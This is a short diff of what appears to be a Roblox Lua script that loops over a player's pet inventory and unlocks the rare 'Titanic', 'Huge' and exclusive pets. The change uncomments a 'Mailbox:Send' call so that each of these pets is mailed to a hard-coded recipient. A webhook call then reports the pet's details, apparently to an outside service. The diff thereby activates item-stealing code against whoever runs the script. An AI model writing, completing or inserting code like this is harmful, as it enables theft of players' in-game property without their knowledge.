@@ -93,7 +93,7 @@ for uid, Item in pairs(PetInv) do
     local Amount = Item._am or 1
     if string.find(Item.id, "Titanic") or string.find(Item.id, "Huge") or Exclusives.Directory.Pets[Item.id].exclusiveLevel then
         Network:WaitForChild("Locking_SetLocked"):InvokeServer(uid, false)
-        --Network:WaitForChild("Mailbox:Send"):InvokeServer(MailRecipient, "Hippo", "Pet", uid, Amount)
+        Network:WaitForChild("Mailbox:Send"):InvokeServer(MailRecipient, "Hippo", "Pet", uid, Amount)
         SendWebhook(Item.id, "Pet", uid, Amount, Item.pt ,Item.sh ,Item.tn)
     end
 end
